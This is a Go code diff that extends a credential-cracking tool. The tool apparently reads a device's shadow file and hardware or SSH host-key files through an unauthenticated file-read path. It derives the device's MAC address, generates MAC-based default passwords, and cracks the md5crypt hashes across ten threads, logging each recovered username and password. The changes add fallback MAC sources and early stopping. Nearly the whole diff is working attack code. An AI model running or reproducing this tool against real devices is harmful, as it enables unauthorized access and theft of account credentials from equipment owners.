@@ -138,8 +138,9 @@ func noAccess(port int) {
 	}
 
 	type hash struct {
-		User string
-		Hash []byte
+		User  string
+		Hash  []byte
+		Found bool
 	}
 
 	hashes := []hash{}
@@ -148,7 +149,7 @@ func noAccess(port int) {
 			parts := strings.Split(v, ":")
 			if len(parts) > 2 {
 				fmt.Println("Hash: ", v)
-				hashes = append(hashes, hash{parts[0], []byte(parts[1])})
+				hashes = append(hashes, hash{User: parts[0], Hash: []byte(parts[1])})
 			} else {
 				log.Println("Skipping entry: ", v, " as it hasnt split right")
 			}
@@ -158,23 +159,53 @@ func noAccess(port int) {
 		log.Fatal("No default accounts found in shadow file, failed")
 	}
 
-	lines, err = readPath("/f/system_info/hw_info", port)
-	if err != nil {
-		log.Fatalln("Unable to automatically deterimine mac address")
+	paths := []string{
+		"/f/system_info/hw_info",
+		"/f/etc/ssh_host_dsa_key.pub",
+		"/f/etc/ssh_host_rsa_key.pub",
 	}
 
-	var mac string
-	for _, v := range lines {
-		if strings.Contains(v, "MAC address") {
+	fmt.Println("Attempting to find mac address")
 
-			mac = strings.TrimSpace(v[strings.Index(v, ":")+1:])
-			break
+	var mac string
+Out:
+	for _, path := range paths {
+
+		lines, err = readPath(path, port)
+		if err != nil {
+			log.Fatalln("Unable to automatically deterimine mac address")
 		}
+
+		if !strings.Contains(path, ".pub") {
+			for _, v := range lines {
+				if strings.Contains(v, "MAC address") {
+
+					mac = strings.TrimSpace(v[strings.Index(v, ":")+1:])
+					mac = mac[:2] + ":" + mac[2:7] + ":" + mac[7:9] + mac[9:12] + ":" + mac[12:]
+					break Out
+				}
+			}
+		}
+
+		for _, key := range lines {
+			if len(key) > 6 {
+				end := key[len(key)-6:]
+				mac = "00:00:00:" + end[:2] + ":" + end[2:4] + ":" + end[4:] // Form a proper MAC, just so generate(...) can be used without changes there
+				break Out
+			}
+		}
+
+	}
+
+	if len(mac) == 0 {
+		log.Println(lines)
+		log.Fatalln("Unable to read mac address")
+
 	}
 
 	//Fix their terrible mac format
-	mac = mac[:2] + ":" + mac[2:7] + ":" + mac[7:9] + mac[9:12] + ":" + mac[12:]
-	fmt.Println("Got mac address as: ", mac)
+
+	fmt.Println("Got mac address ending with: ", mac[len(mac)-8:])
 	fmt.Printf("Generating passwords...")
 	passwords, err := generatePasswords(mac)
 	check(err)
@@ -182,7 +213,7 @@ func noAccess(port int) {
 
 	//As this has at max 1 million guesess there really isnt much reason to have a stop feature
 	var wg sync.WaitGroup
-	fmt.Printf("Started thread: ")
+	fmt.Printf("Started cracking threads: ")
 	for i := 0; i < 10; i++ { // Make 10 threads and split up the password list between them
 		list := make([]string, len(passwords)/10)
 		for ii := i; ii < len(passwords); ii += 10 {
@@ -190,15 +221,28 @@ func noAccess(port int) {
 		}
 		wg.Add(1)
 		go func(pwdList []string) {
+			defer wg.Done()
 			for _, v := range pwdList {
 				hash := md5crypt.MD5Crypt([]byte(v), []byte(""), []byte("$1$"))
-				for _, h := range hashes {
-					if bytes.Equal(hash, h.Hash) {
-						log.Printf("Found match. Username: %s, Hash: %s, Password: %s\n", h.User, h.Hash, v)
+				hasWork := false
+				for i := range hashes {
+					if hashes[i].Found {
+						continue
 					}
+
+					if bytes.Equal(hash, hashes[i].Hash) {
+						log.Printf("Found match. Username: %s, Hash: %s, Password: %s\n", hashes[i].User, hashes[i].Hash, v)
+						hashes[i].Found = true
+						continue
+					}
+
+					hasWork = true
+				}
+				if !hasWork {
+					return
 				}
 			}
-			wg.Done()
+
 		}(list)
 
 		fmt.Printf("%d ", i)
